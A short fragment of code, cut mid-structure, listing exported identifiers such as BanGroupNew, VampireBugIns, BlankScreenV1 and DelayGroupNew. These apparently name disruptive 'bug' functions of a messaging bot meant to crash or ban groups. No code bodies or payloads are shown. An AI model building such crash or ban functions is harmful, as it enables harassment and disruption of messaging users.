  BanGroupNew, VampireBugIns, BlankGroupEraV1, 
  groupBan, groupBan1, BlankScreenV1, DelayGroupNew,
};